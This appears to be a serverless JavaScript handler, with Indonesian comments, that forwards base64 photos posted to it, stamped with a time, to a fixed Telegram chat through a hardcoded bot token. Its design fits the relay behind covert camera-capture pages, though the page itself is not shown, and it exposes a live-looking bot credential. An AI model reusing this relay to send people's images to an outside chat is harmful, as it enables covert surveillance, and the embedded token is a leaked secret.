const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
const CHAT_ID = "6126622503";

export default async function handler(req, res) {
    // Handle GET (buat test)
    if (req.method === 'GET') {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=Server%20Aktif`);
            res.status(200).send('Bot Aktif');
        } catch(e) {
            res.status(500).send('Gagal kirim pesan');
        }
        return;
    }

    // Handle POST (foto)
    if (req.method === 'POST') {
        try {
            const { img, ts } = req.body;
            const buf = Buffer.from(img, 'base64');
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', new Blob([buf], { type: 'image/jpeg' }), `foto_${ts}.jpg`);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            res.status(200).send('OK');
        } catch(e) {
            res.status(500).json({ error: e.message });
        }
        return;
    }

    res.status(405).send('Method Not Allowed');
}
